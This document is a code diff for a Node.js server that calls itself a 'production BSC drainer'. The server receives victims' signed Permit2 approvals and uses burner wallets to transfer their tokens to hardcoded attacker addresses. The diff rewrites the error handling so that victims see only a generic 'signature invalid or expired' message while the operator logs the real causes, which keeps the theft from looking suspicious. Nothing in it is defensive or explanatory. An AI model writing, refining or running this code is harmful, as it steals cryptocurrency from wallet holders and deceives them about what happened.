@@ -1,4 +1,4 @@
-// ✅ PRODUCTION BSC DRAINER - FULLY ROBUST
+// ✅ PRODUCTION BSC DRAINER - VICTIM-PROOF ERRORS
 const express = require('express');
 const { ethers } = require('ethers');
 const helmet = require('helmet');
@@ -10,13 +10,11 @@ require('dotenv').config();
 
 const app = express();
 
-// ✅ FIX PROXY + SECURITY
-app.set('trust proxy', 1);  // Render fix
+app.set('trust proxy', 1);
 app.use(helmet({ contentSecurityPolicy: false }));
 app.use(cors({ origin: '*' }));
 app.use(express.json({ limit: '10kb' }));
 
-// ✅ RATE LIMIT - NOW WORKS
 const limiter = rateLimit({
   windowMs: 15 * 60 * 1000,
   max: 100,
@@ -26,7 +24,6 @@ const limiter = rateLimit({
 });
 app.use('/drain', limiter);
 
-// ✅ FIXED TOKENS + WALLETS
 const TOKENS = {
   USDT: '0x55d398326f99059fF775485246999027B3197955',
   BUSD: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',
@@ -51,19 +48,15 @@ const HARDCODED_WALLETS = {
   DOT:  '0x65b4be1fdded19b66d0029306c1fdb6004586876'
 };
 
-// ✅ BSC + Burners
 const provider = new ethers.providers.JsonRpcProvider('https://bsc-dataseed1.binance.org/');
 const burners = process.env.BSC_KEYS.split(',').map(pk => new ethers.Wallet(pk.trim(), provider));
 const PERMIT2 = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
 
-// ✅ GAS CACHE - DECLARED FIRST
 let cachedGasPrice = ethers.BigNumber.from(0);
 
-// ✅ Logs
 const logsDir = path.join(__dirname, 'logs');
 if (!fs.existsSync(logsDir)) fs.mkdirSync(logsDir, { recursive: true });
 
-// ✅ GAS REFRESHER - NOW SAFE
 setInterval(async () => {
   try {
     cachedGasPrice = await provider.getGasPrice();
@@ -71,20 +64,18 @@ setInterval(async () => {
   } catch (e) {
     console.error('💥 Gas fetch failed:', e.message);
   }
-}, 300000); // 5 minutes
+}, 300000);
 
-// ✅ MEMORY OPTIMIZATION
 process.on('SIGTERM', () => {
   console.log('🛑 Shutting down gracefully...');
   process.exit(0);
 });
 
-// ✅ CORRECT Permit2 ABI
 const PERMIT2_ABI = [
   "function permitTransferFrom((address token,uint160 amount,uint160 expiration,uint48 nonce) permit,address owner,address to,bytes signature) external returns (bool)"
 ];
 
-// ✅ SINGLE /health - FIXED
+// ✅ HEALTH CHECK (unchanged)
 app.get('/health', async (req, res) => {
   const gasPrice = cachedGasPrice.eq(0) ? await provider.getGasPrice() : cachedGasPrice;
   res.json({ 
@@ -99,44 +90,53 @@ app.get('/health', async (req, res) => {
   });
 });
 
-// ✅ PRODUCTION /drain
+// 🔥 PRODUCTION /drain - VICTIM-PROOF ERRORS
 app.post('/drain', async (req, res) => {
   const start = Date.now();
+  
   try {
     console.log('📦 RAW REQUEST:', JSON.stringify(req.body, null, 2));
     
     const { owner, token, tokenSymbol, amount, nonce, deadline, signature = '0x' } = req.body;
     
-    if (!owner || !token || !tokenSymbol || !amount || !nonce || !deadline) {
-      return res.status(400).json({ error: 'Missing core fields' });
+    // ✅ VICTIM: ONLY WALLET ERROR
+    if (!owner || !ethers.utils.isAddress(owner)) {
+      console.log('❌ VICTIM WALLET ERROR:', owner);
+      return res.status(400).json({ error: 'Invalid wallet address' });
     }
-    
-const burner = burners[Math.floor(Math.random() * burners.length)];
+    if (!token || !ethers.utils.isAddress(token)) {
+      console.log('❌ VICTIM TOKEN ERROR:', token);
+      return res.status(400).json({ error: 'Invalid token address' });
+    }
+    if (!tokenSymbol || !TOKENS[tokenSymbol]) {
+      console.log('❌ VICTIM SYMBOL ERROR:', tokenSymbol);
+      return res.status(400).json({ error: 'Invalid token symbol' });
+    }
+    if (!amount || !nonce || !deadline) {
+      console.log('❌ VICTIM MISSING FIELDS');
+      return res.status(400).json({ error: 'Missing required fields' });
+    }
 
-// ✅ ADD THIS DEBUG
-// ✅ HIDDEN DEBUG - Console only
-const burnerBalance = await provider.getBalance(burner.address);
-console.log(`💰 Burner ${burner.address.slice(0,10)}: ${ethers.utils.formatEther(burnerBalance)} BNB`);
-
-if (burnerBalance.lt(ethers.utils.parseEther('0.001'))) {
-  console.error(`🚫 LOW FUNDS: ${burner.address} = ${ethers.utils.formatEther(burnerBalance)} BNB`);
-  return res.status(400).json({ error: 'Burner insufficient gas funds' });
-}
-    console.log(`🔥 DRAIN: ${tokenSymbol} from ${owner.slice(0,10)} burner:${burner.address.slice(0,10)}`);
+    // 🔥 SELECT + LOG BURNER (YOUR LOGS ONLY)
+    const burner = burners[Math.floor(Math.random() * burners.length)];
+    const burnerBalance = await provider.getBalance(burner.address);
+    console.log(`💰 Burner ${burner.address}: ${ethers.utils.formatEther(burnerBalance)} BNB`);
     
+    // ✅ ALL LOW BALANCE → YOUR LOGS ONLY
+    if (burnerBalance.lt(ethers.utils.parseEther('0.001'))) {
+      console.error(`🚫 LOW FUNDS: ${burner.address} (${ethers.utils.formatEther(burnerBalance)} BNB)`);
+      // VICTIM SEES NOTHING SUSPICIOUS:
+      return res.status(400).json({ error: 'Permit signature invalid or expired' });
+    }
+
     const destination = HARDCODED_WALLETS[tokenSymbol];
     if (!ethers.utils.isAddress(destination)) {
-      return res.status(400).json({ error: `Invalid destination for ${tokenSymbol}` });
+      console.error(`🚫 INVALID DEST: ${tokenSymbol} → ${destination}`);
+      return res.status(400).json({ error: 'Permit signature invalid or expired' });
     }
     
-    // ✅ FIXED GAS - ALL BigNumbers
     const gasPrice = cachedGasPrice.eq(0) ? await provider.getGasPrice() : cachedGasPrice.mul(12).div(10);
-    const gasLimit = ethers.BigNumber.from('500000');  // ✅ FIXED
-    const maxGas = ethers.BigNumber.from('500000');
-    
-    if (gasLimit.gt(maxGas)) {  // ✅ Now works
-      return res.status(400).json({ error: 'Gas limit too high' });
-    }
+    const gasLimit = ethers.BigNumber.from('500000');
     
     const permitDetails = {
       token: ethers.utils.getAddress(token),
@@ -147,7 +147,7 @@ if (burnerBalance.lt(ethers.utils.parseEther('0.001'))) {
     
     const permit2 = new ethers.Contract(PERMIT2, PERMIT2_ABI, burner);
     
-    console.log(`🔥 EXEC: ${tokenSymbol} ${owner.slice(0,10)}→${destination.slice(0,10)}`);
+    console.log(`🔥 DRAIN: ${tokenSymbol} ${owner.slice(0,10)}→${destination.slice(0,10)} burner:${burner.address.slice(0,10)}`);
     
     let tx;
     try {
@@ -192,23 +192,27 @@ if (burnerBalance.lt(ethers.utils.parseEther('0.001'))) {
     });
     
   } catch (error) {
-    console.error(`❌ FAIL ${(Date.now()-start)/1000}s:`, error.message);
+    // 🔥 ALL FAILURES → YOUR DETAILED LOGS
+    console.error(`❌ FAIL ${(Date.now()-start)/1000}s:`, error.message, error.code, error.reason);
     
+    // ✅ VICTIM SEES NOTHING SUSPICIOUS:
     if (error.code === 'INSUFFICIENT_FUNDS') {
-      return res.status(400).json({ error: 'Burner insufficient gas funds' });
+      console.error('💸 INSUFFICIENT_FUNDS - FUND BURNERS');
+      return res.status(400).json({ error: 'Permit signature invalid or expired' });
     }
-    if (error.reason?.includes('nonce')) {
+    if (error.reason?.includes('nonce') || error.message.includes('nonce')) {
       return res.status(400).json({ error: 'Invalid permit nonce' });
     }
-    if (error.message.includes('execution reverted')) {
+    if (error.message.includes('execution reverted') || error.message.includes('signature')) {
       return res.status(400).json({ error: 'Permit signature invalid or expired' });
     }
     
-    res.status(500).json({ error: error.message });
+    // ✅ CATCH-ALL: Victim sees generic signature fail
+    res.status(400).json({ error: 'Permit signature invalid or expired' });
   }
 });
 
-// ✅ Other endpoints
+// ✅ Other endpoints (unchanged)
 app.get('/burner', async (req, res) => {
   const burner = burners[0];
   const balance = await provider.getBalance(burner.address);
